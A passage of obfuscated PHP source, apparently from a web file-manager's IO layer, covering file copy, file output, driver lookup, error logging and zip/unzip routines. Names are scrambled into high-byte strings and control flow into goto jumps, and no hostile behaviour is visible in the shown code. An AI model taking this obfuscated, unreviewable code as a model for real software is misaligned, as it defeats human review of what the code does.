$DÕ‡öèåÌ->getPathInner($Aêó‰½‰¢Ê); $eæŠ› öªá = $b§„³ÌÛ‚->listPath($FØ×ê¸á‚æ, !0); goto C÷ëè»³æ; CßĞïªÖÏ: if ($AœÃ Œñ) { return self::copyFile($b§„³ÌÛ‚, $FØ×ê¸á‚æ, $DÕ‡öèåÌ, $B¢ùÒ¼š¹Å, $E©¶Å£œëß, $aİß²¨Éİ…); } if ($Cß½ŠÓè == REPEAT_RENAME_FOLDER) { $Cß½ŠÓè = !1; } $d˜Í‡óºÄ = rtrim($B¢ùÒ¼š¹Å, $aÃœ‹ÇàÖ[8]) . $aÃœ‹ÇàÖ[8] . $E©¶Å£œëß; goto f¡Û¹£Õöµ; C÷ëè»³æ: $C‚„ç÷Ö…ù = array_merge($eæŠ› öªá[$aÃœ‹ÇàÖ[73]], $eæŠ› öªá[$aÃœ‹ÇàÖ[74]]); foreach ($C‚„ç÷Ö…ù as $A‡„¨„Ü¼) { $f˜«Ä¿”³® = $A‡„¨„Ü¼[$aÃœ‹ÇàÖ[29]] == $aÃœ‹ÇàÖ[173]; $FØ×ê¸á‚æ = $b§„³ÌÛ‚->getPathInner($A‡„¨„Ü¼[$aÃœ‹ÇàÖ[75]]); $bÍ«ä¥†ÅÀ = self::copyPath($b§„³ÌÛ‚, $FØ×ê¸á‚æ, $DÕ‡öèåÌ, $B¢ùÒ¼š¹Å, $Cß½ŠÓè, $aİß²¨Éİ…, $f˜«Ä¿”³®); if (!$bÍ«ä¥†ÅÀ) { IO::errorTips($aÃœ‹ÇàÖ[1030] . $FØ×ê¸á‚æ . $aÃœ‹ÇàÖ[66] . $B¢ùÒ¼š¹Å); } } return $Aêó‰½‰¢Ê; goto e±ï·ËË§ö; E¥ÀÉ¤¹¤Ê: $aÃœ‹ÇàÖ =& $_SERVER[Æ¼ôºÙï]; $E©¶Å£œëß = $fç¸Ù¦„çğ ? $fç¸Ù¦„çğ : $b§„³ÌÛ‚->pathThis($FØ×ê¸á‚æ); if ($Cß½ŠÓè) { $BÚœæ£î¯â = $DÕ‡öèåÌ->fileNameExist($B¢ùÒ¼š¹Å, $E©¶Å£œëß); $E©¶Å£œëß = $DÕ‡öèåÌ->fileNameAuto($B¢ùÒ¼š¹Å, $E©¶Å£œëß, $Cß½ŠÓè, !$AœÃ Œñ); $Cß½ŠÓè = $BÚœæ£î¯â ? $Cß½ŠÓè : !1; } goto CßĞïªÖÏ; e±ï·ËË§ö: } private static function copyFile($b‹ŒŠëè‹ì, $B¬®ÃõíØì, $F¨ôËˆ·åˆ, $c«ÂÅğòÆï, $cßáÍè¾óğ, $CŞ˜Â²Ô‹›) { goto c‚³ÔŞ«Ç; EªÙŠËáä©: Hook::trigger($DŸ×ÅâÖ—–[1033], $b‹ŒŠëè‹ì, $B¬®ÃõíØì, $F¨ôËˆ·åˆ, $c«ÂÅğòÆï, $cßáÍè¾óğ, $AÆ‡¼ì‘Î·); return $AÆ‡¼ì‘Î·; goto c„Š©õ‚»ì; F×ŞæÃ¡‘•: $f½ï¦ˆŠ‚¸ = $b‹ŒŠëè‹ì->iconvApp($f½ï¦ˆŠ‚¸); $AÆ‡¼ì‘Î· = $F¨ôËˆ·åˆ->upload($c«ÂÅğòÆï, $f½ï¦ˆŠ‚¸, $CŞ˜Â²Ô‹›); self::remove($C¬¬Ç»©® . $CËÏ‚‡×±); goto EªÙŠËáä©; BªÊ›Æ²ù: Hook::trigger($DŸ×ÅâÖ—–[1032], $b‹ŒŠëè‹ì, $B¬®ÃõíØì, $F¨ôËˆ·åˆ, $c«ÂÅğòÆï, $cßáÍè¾óğ, $CËÏ‚‡×±); if (self::driverIsSame($b‹ŒŠëè‹ì, $F¨ôËˆ·åˆ)) { if ($CŞ˜Â²Ô‹›) { $AÆ‡¼ì‘Î· = $F¨ôËˆ·åˆ->moveFile($B¬®ÃõíØì, $c«ÂÅğòÆï); } else { $AÆ‡¼ì‘Î· = $F¨ôËˆ·åˆ->copyFile($B¬®ÃõíØì, $c«ÂÅğòÆï); } Hook::trigger($DŸ×ÅâÖ—–[1033], $b‹ŒŠëè‹ì, $B¬®ÃõíØì, $F¨ôËˆ·åˆ, $c«ÂÅğòÆï, $cßáÍè¾óğ, $AÆ‡¼ì‘Î·); return $AÆ‡¼ì‘Î·; } $C¬¬Ç»©® = TEMP_FILES; goto E­è…ª‰ïé; E­è…ª‰ïé: mk_dir($C¬¬Ç»©®); $f½ï¦ˆŠ‚¸ = $C¬¬Ç»©® . $CËÏ‚‡×±; $f½ï¦ˆŠ‚¸ = $b‹ŒŠëè‹ì->download($B¬®ÃõíØì, $f½ï¦ˆŠ‚¸); goto F×ŞæÃ¡‘•; c‚³ÔŞ«Ç: $DŸ×ÅâÖ—– =& $_SERVER[Æ¼ôºÙï]; $c«ÂÅğòÆï = $F¨ôËˆ·åˆ->getPath(rtrim($c«ÂÅğòÆï, $DŸ×ÅâÖ—–[8]) . $DŸ×ÅâÖ—–[8] . $cßáÍè¾óğ); $CËÏ‚‡×± = $DŸ×ÅâÖ—–[1031] . time() . rand_string(5); goto BªÊ›Æ²ù; c„Š©õ‚»ì: } public static function pathFather($eÁ›«é†•) { $FõÆôÕ¾ = IO::init($eÁ›«é†•); $D‡¹‡‘òÜ = $FõÆôÕ¾->pathFather($FõÆôÕ¾->path); return $FõÆôÕ¾->getPathOuter($D‡¹‡‘òÜ); } public static function fileOut($c“¤§ï˜¼ò, $d­¥Ù…îòï = false, $FÅ¾¸´³„È = false, $e¬‚Ê°“Ó = '') { $Cñ»Òùç£í = self::driverMake($c“¤§ï˜¼ò); if ($Cñ»Òùç£í->isFileOutServer()) { return $Cñ»Òùç£í->fileOutServer($c“¤§ï˜¼ò, $d­¥Ù…îòï, $FÅ¾¸´³„È, $e¬‚Ê°“Ó); } return $Cñ»Òùç£í->fileOut($c“¤§ï˜¼ò, $d­¥Ù…îòï, $FÅ¾¸´³„È, $e¬‚Ê°“Ó); } public static function fileOutImage($fƒ³êÏ‰æ¡, $aÚ‡¨ˆïƒ« = 250) { $DçÓ­«¾º = array(250, 600, 1200, 3000, 5000); for ($dÕŠÂÇ„×Ã = 0; $dÕŠÂÇ„×Ã < count($DçÓ­«¾º); $dÕŠÂÇ„×Ã++) { if ($dÕŠÂÇ„×Ã == 0 && $aÚ‡¨ˆïƒ« <= $DçÓ­«¾º[$dÕŠÂÇ„×Ã]) { $aÚ‡¨ˆïƒ« = $DçÓ­«¾º[$dÕŠÂÇ„×Ã]; break; } else { if ($aÚ‡¨ˆïƒ« > $DçÓ­«¾º[$dÕŠÂÇ„×Ã - 1] && $aÚ‡¨ˆïƒ« <= $DçÓ­«¾º[$dÕŠÂÇ„×Ã]) { $aÚ‡¨ˆïƒ« = $DçÓ­«¾º[$dÕŠÂÇ„×Ã]; break; } else { if ($dÕŠÂÇ„×Ã == count($DçÓ­«¾º) - 1 && $aÚ‡¨ˆïƒ« > $DçÓ­«¾º[$dÕŠÂÇ„×Ã]) { $aÚ‡¨ˆïƒ« = $DçÓ­«¾º[$dÕŠÂÇ„×Ã]; break; } } } } $e†ìåàëâî = self::driverMake($fƒ³êÏ‰æ¡); if ($e†ìåàëâî->isFileOutServer()) { return $e†ìåàëâî->fileOutImageServer($fƒ³êÏ‰æ¡, $aÚ‡¨ˆïƒ«); } return $e†ìåàëâî->fileOutImage($fƒ³êÏ‰æ¡, $aÚ‡¨ˆïƒ«); } private static function driverIsSame($cáÄÈ¡Ä¹Å, $c‰‰²âŞƒ) { goto cÚó™¿Ëğ; B±¢“ŒĞ†°: if ($cáÄÈ¡Ä¹Å->pathDriver == $c‰‰²âŞƒ->pathDriver) { return !0; } return !1; goto c¬éõŠ‹Ç½; cÚó™¿Ëğ: $Bêã›’İê =& $_SERVER[Æ¼ôºÙï]; $dÛİ¢ùèï = $cáÄÈ¡Ä¹Å->getType(); $eë‹¹Ñ‰¢ = $c‰‰²âŞƒ->getType(); goto A«×ÏèŞÀ›; A«×ÏèŞÀ›: if ($dÛİ¢ùèï != $eë‹¹Ñ‰¢) { return !1; } if ($dÛİ¢ùèï == $Bêã›’İê[713]) { return !0; } if ($dÛİ¢ùèï == $Bêã›’İê[105]) { return !0; } goto B±¢“ŒĞ†°; c¬éõŠ‹Ç½: } public static function copyUpdate($bã†‹ëîÂ, $c¬ŞÉ«ê˜Ñ) { goto dßÓ¶ˆ¶£; BƒòÑß‡«: $D¯Ï‚¤¤‰ = self::_listAll($bã†‹ëîÂ); $D´¹ºö¯êİ = self::_listAll($c¬ŞÉ«ê˜Ñ); $a‰£Åßºä¡ = array(); goto Açù¥ÙàÖ; D‡‰–ï¿¡½: Hook::trigger($C‡µÆ¢„ñ³[1037], $bã†‹ëîÂ, $c¬ŞÉ«ê˜Ñ, $a¿Ìï¾íÏ¶); foreach ($D¸‡İ÷ÅÑ as $d‘Ï‰ šç) { IO::mkdir($d‘Ï‰ šç); } foreach ($a‰£Åßºä¡ as $d‘Ï‰ šç) { IO::copy($d‘Ï‰ šç[$C‡µÆ¢„ñ³[1034]], $d‘Ï‰ šç[$C‡µÆ¢„ñ³[1035]], REPEAT_REPLACE); } goto AËÆÎ‚Ë¡…; dßÓ¶ˆ¶£: $C‡µÆ¢„ñ³ =& $_SERVER[Æ¼ôºÙï]; if (!IO::exist($bã†‹ëîÂ)) { return !1; } if (!IO::exist($c¬ŞÉ«ê˜Ñ)) { IO::mkdir($c¬ŞÉ«ê˜Ñ); } goto BƒòÑß‡«; Açù¥ÙàÖ: $D¸‡İ÷ÅÑ = array(); foreach ($D¯Ï‚¤¤‰ as $E¢¡ŸòÓ‚ï => $d‘Ï‰ šç) { if (isset($D´¹ºö¯êİ[$E¢¡ŸòÓ‚ï])) { if ($d‘Ï‰ šç[$C‡µÆ¢„ñ³[76]] == 1) { continue; } if ($D´¹ºö¯êİ[$E¢¡ŸòÓ‚ï][$C‡µÆ¢„ñ³[77]] == $d‘Ï‰ šç[$C‡µÆ¢„ñ³[77]]) { continue; } } if ($d‘Ï‰ šç[$C‡µÆ¢„ñ³[76]] == 1) { $D¸‡İ÷ÅÑ[] = $c¬ŞÉ«ê˜Ñ . $C‡µÆ¢„ñ³[8] . $E¢¡ŸòÓ‚ï; continue; } $BÚœÕÎéã = strstr(trim($E¢¡ŸòÓ‚ï, $C‡µÆ¢„ñ³[8]), $C‡µÆ¢„ñ³[8]) ? get_path_father($E¢¡ŸòÓ‚ï) : $C‡µÆ¢„ñ³[33]; $a‰£Åßºä¡[] = array($C‡µÆ¢„ñ³[1034] => $d‘Ï‰ šç[$C‡µÆ¢„ñ³[75]], $C‡µÆ¢„ñ³[1035] => rtrim($c¬ŞÉ«ê˜Ñ, $C‡µÆ¢„ñ³[8]) . $C‡µÆ¢„ñ³[8] . $BÚœÕÎéã, $C‡µÆ¢„ñ³[1036] => $d‘Ï‰ šç); } $a¿Ìï¾íÏ¶ = array($C‡µÆ¢„ñ³[173] => $a‰£Åßºä¡, $C‡µÆ¢„ñ³[76] => $D¸‡İ÷ÅÑ); goto D‡‰–ï¿¡½; AËÆÎ‚Ë¡…: } private static function _listAll($eÕ™ëîŠó£) { $D†ğ²–ÅŠ« =& $_SERVER[Æ¼ôºÙï]; $eÕ™ëîŠó£ = KodIO::clear($eÕ™ëîŠó£); $dˆŒÊñ¥ = IO::listAll($eÕ™ëîŠó£); foreach ($dˆŒÊñ¥ as &$bÃÑ‡ôÊ“ç) { $dªºïåÌ” = substr($bÃÑ‡ôÊ“ç[$D†ğ²–ÅŠ«[75]], strlen($eÕ™ëîŠó£)); $bÃÑ‡ôÊ“ç[$D†ğ²–ÅŠ«[1038]] = trim($dªºïåÌ”, $D†ğ²–ÅŠ«[8]); } unset($bÃÑ‡ôÊ“ç); return array_to_keyvalue($dˆŒÊñ¥, $D†ğ²–ÅŠ«[1038]); } public static function fileSubstr($B¬•»¤Úšˆ, $dÕÄç½‰£‡, $b÷µ“‡£´å = false) { goto Bõß÷ÉŸãÀ; Bõß÷ÉŸãÀ: $f‡Şù„© =& $_SERVER[Æ¼ôºÙï]; $BÛ­™¦± = self::driverMake($B¬•»¤Úšˆ); $a¼ÉßÅ™Î = $BÛ­™¦±->size($B¬•»¤Úšˆ); goto a…Õœ®Èğ; a…Õœ®Èğ: $DÓçÚ¿Û‹ = $dÕÄç½‰£‡; $F¯ ‡Êè² = $b÷µ“‡£´å; if ($dÕÄç½‰£‡ < 0) { $dÕÄç½‰£‡ = $a¼ÉßÅ™Î + $dÕÄç½‰£‡; } goto dêøŞˆÑ£; eÚÅ¬†Œ§Ä: if ($b÷µ“‡£´å <= 0) { return $f‡Şù„©[33]; } if ($dÕÄç½‰£‡ < 0 || $dÕÄç½‰£‡ >= $a¼ÉßÅ™Î || $b÷µ“‡£´å > 1024 * 1024 * 5) { throw new Exception("\146\x69\x6c\145\122\x65\x61\144\40\x65\162\x72\157\162\41\40\163\164\x61\x72\164\75{$dÕÄç½‰£‡}\73\x6c\x65\156\x67\x74\x68\75{$b÷µ“‡£´å}\73\x20\163\151\172\x65\x3d{$a¼ÉßÅ™Î}\73"); } $eŞ­à¦ô…ß = $BÛ­™¦±->fileSubstr($B¬•»¤Úšˆ, $dÕÄç½‰£‡, $b÷µ“‡£´å); goto Bì¦²ÙË¬; Bì¦²ÙË¬: if (!$eŞ­à¦ô…ß && $b÷µ“‡£´å && isset($GLOBALS[$f‡Şù„©[1041]])) { throw new Exception($GLOBALS[$f‡Şù„©[1041]][$f‡Şù„©[1042]]); } return $eŞ­à¦ô…ß; goto bğƒ¾’ŸÔ¿; dêøŞˆÑ£: if ($b÷µ“‡£´å === !1) { $b÷µ“‡£´å = $a¼ÉßÅ™Î - $dÕÄç½‰£‡; } if ($dÕÄç½‰£‡ + $b÷µ“‡£´å > $a¼ÉßÅ™Î) { $b÷µ“‡£´å = $a¼ÉßÅ™Î - $dÕÄç½‰£‡; } if (!$a¼ÉßÅ™Î && $BÛ­™¦±->getType() == $f‡Şù„©[105] && !$BÛ­™¦±->exist($B¬•»¤Úšˆ)) { throw new Exception($f‡Şù„©[1039] . LNG($f‡Şù„©[1040])); } goto eÚÅ¬†Œ§Ä; bğƒ¾’ŸÔ¿: } private static function driverMake(&$e…ÎÌ„Ï§ò) { goto dÍ°ÓÕ’ĞÛ; cÊƒİ°å¹: if ($Bõ¯å“Úª[$AÃìÀ¾³ó´[29]] == KodIO::KOD_IO && !self::$driverListSystem[$Bõ¯å“Úª[$AÃìÀ¾³ó´[385]]]) { return !1; } $e…ÎÌ„Ï§ò = $Bõ¯å“Úª[$AÃìÀ¾³ó´[1043]]; $f…ìÕÆäÈø = self::driverGet($Bõ¯å“Úª, $e…ÎÌ„Ï§ò); goto fä”£Ö£; dÍ°ÓÕ’ĞÛ: $AÃìÀ¾³ó´ =& $_SERVER[Æ¼ôºÙï]; $Bõ¯å“Úª = KodIO::parse($e…ÎÌ„Ï§ò); if (!self::$driverListSystem) { $AœÙ³·Äçµ = Model($AÃìÀ¾³ó´[722])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($AœÙ³·Äçµ, $AÃìÀ¾³ó´[385]); } goto cÊƒİ°å¹; fä”£Ö£: return $f…ìÕÆäÈø; goto FŞ¯“˜ô½Ø; FŞ¯“˜ô½Ø: } private static function driverGet($fêë“á¤Õ, &$Aê¢òÂË¤¹) { goto d™ÓÇè‡ã¦; d™ÓÇè‡ã¦: $E‰©ñ¨§—º =& $_SERVER[Æ¼ôºÙï]; $fè‹ŠÁ™íÍ = $fêë“á¤Õ[$E‰©ñ¨§—º[1044]]; $DÊêŠ†Æ¸ = $fêë“á¤Õ[$E‰©ñ¨§—º[385]]; goto Fê Éƒ‰Ä; C»—›¬¨œ: $b¬ïÇÃ‘Î->path = $Aê¢òÂË¤¹; return $b¬ïÇÃ‘Î; goto fŸ³”æÒÓ; AÊ«Ïã² ›: $b¬ïÇÃ‘Î = self::$driverCache[$A¿ÏÍâŠµ]; $b¬ïÇÃ‘Î->pathDriver = $fè‹ŠÁ™íÍ; $b¬ïÇÃ‘Î->pathBase = $E‰©ñ¨§—º[33]; goto d’Áª¿Ş‰; d’Áª¿Ş‰: if (isset($bšÖ§‹†·µ[$E‰©ñ¨§—º[6]][$E‰©ñ¨§—º[1055]])) { $b¬ïÇÃ‘Î->pathBase = rtrim($bšÖ§‹†·µ[$E‰©ñ¨§—º[6]][$E‰©ñ¨§—º[1055]], $E‰©ñ¨§—º[8]) . $E‰©ñ¨§—º[8]; $Aê¢òÂË¤¹ = $b¬ïÇÃ‘Î->pathBase . ltrim($Aê¢òÂË¤¹, $E‰©ñ¨§—º[8]); } $Aê¢òÂË¤¹ = $b¬ïÇÃ‘Î->getPath($Aê¢òÂË¤¹); if (isset($fêë“á¤Õ[$E‰©ñ¨§—º[1027]])) { $Aê¢òÂË¤¹ = $fêë“á¤Õ[$E‰©ñ¨§—º[1027]]; } goto C»—›¬¨œ; Fê Éƒ‰Ä: switch ($fêë“á¤Õ[$E‰©ñ¨§—º[29]]) { case KodIO::KOD_IO: $bšÖ§‹†·µ = self::$driverListSystem[$DÊêŠ†Æ¸]; break; case KodIO::KOD_SOURCE: $Aê¢òÂË¤¹ = $DÊêŠ†Æ¸ . $Aê¢òÂË¤¹; $bšÖ§‹†·µ = array($E‰©ñ¨§—º[1045] => $E‰©ñ¨§—º[1046], $E‰©ñ¨§—º[6] => $fêë“á¤Õ); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $bÙ¡É‚–Œ = $GLOBALS[$E‰©ñ¨§—º[1047]]; self::$driverListUser = array_to_keyvalue($bÙ¡É‚–Œ, $E‰©ñ¨§—º[385]); } $bšÖ§‹†·µ = self::$driverListUser[$DÊêŠ†Æ¸]; break; case KodIO::KOD_SHARE_LINK: $bšÖ§‹†·µ = array($E‰©ñ¨§—º[1045] => $E‰©ñ¨§—º[1048], $E‰©ñ¨§—º[6] => $fêë“á¤Õ); $EŠë“¥Ú¯Æ = Action($E‰©ñ¨§—º[1049])->sharePathInfo($fêë“á¤Õ[$E‰©ñ¨§—º[75]]); $Aê¢òÂË¤¹ = $EŠë“¥Ú¯Æ[$E‰©ñ¨§—º[387]]; if (!$EŠë“¥Ú¯Æ[$E‰©ñ¨§—º[387]]) { $E¶§–´¢ÎÛ = Model($E‰©ñ¨§—º[552])->getInfo($EŠë“¥Ú¯Æ[$E‰©ñ¨§—º[457]]); $Aê¢òÂË¤¹ = KodIO::clear($E¶§–´¢ÎÛ[$E‰©ñ¨§—º[1050]] . $fêë“á¤Õ[$E‰©ñ¨§—º[1043]]); $fêë“á¤Õ[$E‰©ñ¨§—º[455]] = $E¶§–´¢ÎÛ; $fêë“á¤Õ[$E‰©ñ¨§—º[1027]] = $Aê¢òÂË¤¹; $bšÖ§‹†·µ = array($E‰©ñ¨§—º[1045] => $E‰©ñ¨§—º[1051], $E‰©ñ¨§—º[6] => $fêë“á¤Õ); } break; case KodIO::KOD_SHARE_ITEM: $bšÖ§‹†·µ = array($E‰©ñ¨§—º[1045] => $E‰©ñ¨§—º[1052], $E‰©ñ¨§—º[6] => $fêë“á¤Õ); $E¶§–´¢ÎÛ = Model($E‰©ñ¨§—º[552])->getInfo($fêë“á¤Õ[$E‰©ñ¨§—º[385]]); if ($E¶§–´¢ÎÛ[$E‰©ñ¨§—º[387]] == $E‰©ñ¨§—º[486]) { $Aê¢òÂË¤¹ = KodIO::clear($E¶§–´¢ÎÛ[$E‰©ñ¨§—º[1050]] . $fêë“á¤Õ[$E‰©ñ¨§—º[1043]]); $fêë“á¤Õ[$E‰©ñ¨§—º[455]] = $E¶§–´¢ÎÛ; $fêë“á¤Õ[$E‰©ñ¨§—º[1027]] = $Aê¢òÂË¤¹; $bšÖ§‹†·µ = array($E‰©ñ¨§—º[1045] => $E‰©ñ¨§—º[1053], $E‰©ñ¨§—º[6] => $fêë“á¤Õ); } else { if (!$Aê¢òÂË¤¹) { $Aê¢òÂË¤¹ = $E¶§–´¢ÎÛ[$E‰©ñ¨§—º[387]]; } } break; default: $Aê¢òÂË¤¹ = $fêë“á¤Õ[$E‰©ñ¨§—º[75]]; $bšÖ§‹†·µ = array($E‰©ñ¨§—º[1045] => $E‰©ñ¨§—º[1054]); break; } $A¿ÏÍâŠµ = $fêë“á¤Õ[$E‰©ñ¨§—º[75]]; if (!isset(self::$driverCache[$A¿ÏÍâŠµ])) { $Fæ£‚Ø×çî = strtolower($bšÖ§‹†·µ[$E‰©ñ¨§—º[93]]); $e‰›­ªÒÀ = $GLOBALS[$E‰©ñ¨§—º[6]][$E‰©ñ¨§—º[87]][$E‰©ñ¨§—º[771]]; $e±Óô‹ÇÍ = $E‰©ñ¨§—º[71] . (isset($e‰›­ªÒÀ[$Fæ£‚Ø×çî]) ? $e‰›­ªÒÀ[$Fæ£‚Ø×çî] : ucfirst($Fæ£‚Ø×çî)); if (!class_exists($e±Óô‹ÇÍ)) { show_json("{$e±Óô‹ÇÍ}\x20\156\x6f\164\40\145\x78\x69\163\x74\x73\x21", !1); } $AâŠØ˜Ú‘– = isset($bšÖ§‹†·µ[$E‰©ñ¨§—º[6]]) ? $bšÖ§‹†·µ[$E‰©ñ¨§—º[6]] : !1; self::$driverCache[$A¿ÏÍâŠµ] = new $e±Óô‹ÇÍ($AâŠØ˜Ú‘–); } goto AÊ«Ïã² ›; fŸ³”æÒÓ: } public static function errorTips($eÑ³‚–Ğ•Ã = false) { goto d‹Å†ˆÉµÈ; a“±†§ç¹¦: $FØ—‡”å [] = $eÑ³‚–Ğ•Ã; write_log($dÄ§Ğî©…œ[159] . ACTION . $dÄ§Ğî©…œ[1056] . $eÑ³‚–Ğ•Ã, $dÄ§Ğî©…œ[1057]); goto A„ß†šËŒÒ; d‹Å†ˆÉµÈ: $dÄ§Ğî©…œ =& $_SERVER[Æ¼ôºÙï]; static $FØ—‡”å  = array(); $d”Ä£§¾Í‰ = 1000; goto a§ˆÎêØ‹Ÿ; a§ˆÎêØ‹Ÿ: if ($eÑ³‚–Ğ•Ã === -1) { return $FØ—‡”å  ? $FØ—‡”å [count($FØ—‡”å ) - 1] : $dÄ§Ğî©…œ[33]; } if ($eÑ³‚–Ğ•Ã === !1) { return implode($dÄ§Ğî©…œ[227], $FØ—‡”å ); } if (count($FØ—‡”å ) >= $d”Ä£§¾Í‰) { $FØ—‡”å  = array_slice($FØ—‡”å , $d”Ä£§¾Í‰ * 0.5, $d”Ä£§¾Í‰); } goto a“±†§ç¹¦; A„ß†šËŒÒ: } public static function getLastError($FÈá÷¢ºõ = '') { $a°–—‹‚˜Ø = self::errorTips(-1); return $a°–—‹‚˜Ø ? $a°–—‹‚˜Ø : $FÈá÷¢ºõ; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $ağ¬Ó×ã°Œ; if (!$ağ¬Ó×ã°Œ) { $d®ÈË½§ÛÏ = IO::init($_SERVER[Æ¼ôºÙï][8]); } return $d®ÈË½§ÛÏ; } private static function iconvSystem($BÊÕĞô¹‚Ä) { return self::local()->iconvSystem($BÊÕĞô¹‚Ä); } private static function iconvApp($Cæª²£¸Âœ) { return self::local()->iconvApp($Cæª²£¸Âœ); } public static function zip($c„ñ×‚¿‡‡, $F¥øˆé¢ê¼ = "\x7a\151\160", $A‡ÁŒ¼Ô» = '', $D×Ó”†£Ë£ = REPEAT_RENAME) { goto bÓ ŞîÚ‘­; f·÷àçéÛ“: if (!$cšÕÕ…á¬) { del_dir($CŒ¹¡·Œ™); show_json(LNG($c¬ÌÖ˜óë¨[1060]), !1); } del_dir($CŒ¹¡·Œ™); return $cšÕÕ…á¬; goto dÜ”…ï¡¸·; cºÚ±ØÖõŒ: $C•„®Œœù† = $A„‰‡’³Š . $B‡é‹”áë . $c¬ÌÖ˜óë¨[94] . $F¥øˆé¢ê¼; $C•„®Œœù† = get_filename_auto($C•„®Œœù†, $c¬ÌÖ˜óë¨[33], $D×Ó”†£Ë£); $cÛÄÆÎèÇ„ = self::iconvSystem($C•„®Œœù†); goto aÚƒÇ¸—®ª; B·ôÏÛ¹é: $CŒ¹¡·Œ™ = !1; if (!$A‡ÁŒ¼Ô» && $c™ÎßÂ”£->getType() == $c¬ÌÖ˜óë¨[105]) { $AµƒØöì‘ò = self::zipFileList($c„ñ×‚¿‡‡); } else { $CŒ¹¡·Œ™ = $A‡ÁŒ¼Ô» ? $A‡ÁŒ¼Ô» : TEMP_FILES . $c¬ÌÖ˜óë¨[1058] . time() . rand_string(8) . $c¬ÌÖ˜óë¨[8]; mk_dir($CŒ¹¡·Œ™); $AµƒØöì‘ò = self::zipFileList($c„ñ×‚¿‡‡, $CŒ¹¡·Œ™); } $B‡é‹”áë = $C²¯ÂèğÄ‹[$c¬ÌÖ˜óë¨[28]]; goto b¥¢Éë½ø; b¥¢Éë½ø: if (count($AµƒØöì‘ò) > 1) { $C±‡ˆÙ­ï = IO::info(IO::pathFather($C²¯ÂèğÄ‹[$c¬ÌÖ˜óë¨[75]])); $B‡é‹”áë = $C±‡ˆÙ­ï[$c¬ÌÖ˜óë¨[28]]; } $A„‰‡’³Š = $CŒ¹¡·Œ™; if (!$A„‰‡’³Š) { $A„‰‡’³Š = get_path_father($C²¯ÂèğÄ‹[$c¬ÌÖ˜óë¨[75]]); if (!$A‡ÁŒ¼Ô» && $c™ÎßÂ”£->getType() == $c¬ÌÖ˜óë¨[105]) { $A„‰‡’³Š = get_path_father($c™ÎßÂ”£->path); } $aÉĞÓæÅ = IO::info($A„‰‡’³Š); if (!$aÉĞÓæÅ[$c¬ÌÖ˜óë¨[194]]) { show_json(LNG($c¬ÌÖ˜óë¨[1059]), !1); } } goto cºÚ±ØÖõŒ; aÚƒÇ¸—®ª: foreach ($AµƒØöì‘ò as $FÒÃ¯ö î„ => $c®•Á®±˜Ñ) { $AµƒØöì‘ò[$FÒÃ¯ö î„] = self::iconvSystem($c®•Á®±˜Ñ); } KodArchive::create($cÛÄÆÎèÇ„, $AµƒØöì‘ò); if (!IO::exist($C•„®Œœù†)) { if ($CŒ¹¡·Œ™) { del_dir($CŒ¹¡·Œ™); } show_json(LNG($c¬ÌÖ˜óë¨[1060]), !1); } goto aªÚîßÎ÷; aªÚîßÎ÷: if ($A‡ÁŒ¼Ô» || !$CŒ¹¡·Œ™) { if ($CŒ¹¡·Œ™ && strstr($CŒ¹¡·Œ™, TEMP_FILES)) { $FíĞîŒ±„ = $AµƒØöì‘ò = array(); recursion_dir($A„‰‡’³Š, $FíĞîŒ±„, $AµƒØöì‘ò, 0); foreach ($FíĞîŒ±„ as $C¾¾¹±®ˆù) { del_dir($C¾¾¹±®ˆù); } foreach ($AµƒØöì‘ò as $dÈÓ ƒ) { if ($dÈÓ ƒ == $cÛÄÆÎèÇ„) { continue; } del_file($dÈÓ ƒ); } } return $C•„®Œœù†; } $d¤¿ÏË°½ = self::pathFather($C²¯ÂèğÄ‹[$c¬ÌÖ˜óë¨[75]]); $cšÕÕ…á¬ = self::move($C•„®Œœù†, $d¤¿ÏË°½, $D×Ó”†£Ë£); goto f·÷àçéÛ“; bÓ ŞîÚ‘­: $c¬ÌÖ˜óë¨ =& $_SERVER[Æ¼ôºÙï]; $c™ÎßÂ”£ = self::init($c„ñ×‚¿‡‡[0][$c¬ÌÖ˜óë¨[75]]); $C²¯ÂèğÄ‹ = self::info($c„ñ×‚¿‡‡[0][$c¬ÌÖ˜óë¨[75]]); goto B·ôÏÛ¹é; dÜ”…ï¡¸·: } public static function unzip($FÉŠ¥ÏÆô¤, $fµÍøÆÆ» = "\162\145\160\x6c\x61\143\145") { goto AŒÃƒÑÏÒå; AŒÃƒÑÏÒå: $F…ê—ôì =& $_SERVER[Æ¼ôºÙï]; $Fé‡” ˜ôÙ = $FÉŠ¥ÏÆô¤[$F…ê—ôì[75]]; $D¡Õ–ç²µ = $FÉŠ¥ÏÆô¤[$F…ê—ôì[1061]]; goto Fâ¶ì³”‘å; DÜõèº¨ì: Hook::trigger($F…ê—ôì[1068], $dº÷Îßƒ´Š); recursion_dir($dº÷Îßƒ´Š, $dêÎ†óôå, $B¶ìÔµ¡è“, 0); $Aòâ÷¡®™¬ = array_merge($dêÎ†óôå, $B¶ìÔµ¡è“); goto a‹ÒÀ‘˜½Ø; E²¹§ƒ‚: $c°åŠñæ‚õ = KodArchive::extract($Aä–ğÕ†„ , $dº÷Îßƒ´Š . $F…ê—ôì[8], $DÇ¥Æ¹ô‰¼); self::archiveExt(); if (!$c°åŠñæ‚õ[$F…ê—ôì[1065]]) { show_json($F…ê—ôì[1066] . $c°åŠñæ‚õ[$F…ê—ôì[1067]], !1); } goto DÜõèº¨ì; BÁé×Îœ¤: return !0; goto d‡êÛŸøäÚ; Fâ¶ì³”‘å: if (!($c°ã‡›·´Ô = parent::info($Fé‡” ˜ôÙ))) { show_json(LNG($F…ê—ôì[1062]), !1); } if (!($cÜ¶ºÌêôÒ = parent::infoFull($D¡Õ–ç²µ))) { $D¡Õ–ç²µ = parent::mkdir($D¡Õ–ç²µ); $cÜ¶ºÌêôÒ = array($F…ê—ôì[75] => $D¡Õ–ç²µ); } else { if (isset($cÜ¶ºÌêôÒ[$F…ê—ôì[387]]) && trim($cÜ¶ºÌêôÒ[$F…ê—ôì[75]], $F…ê—ôì[8]) != trim($D¡Õ–ç²µ, $F…ê—ôì[8])) { $f ¯ğáĞ‚• = KodIO::make($cÜ¶ºÌêôÒ[$F…ê—ôì[479]]); $fèÔŠ¬øÆ = parent::fileNameAuto($f ¯ğáĞ‚•, $cÜ¶ºÌêôÒ[$F…ê—ôì[28]], REPEAT_RENAME_FOLDER, !0); $D¡Õ–ç²µ = parent::mkdir($f ¯ğáĞ‚• . $fèÔŠ¬øÆ); $cÜ¶ºÌêôÒ = 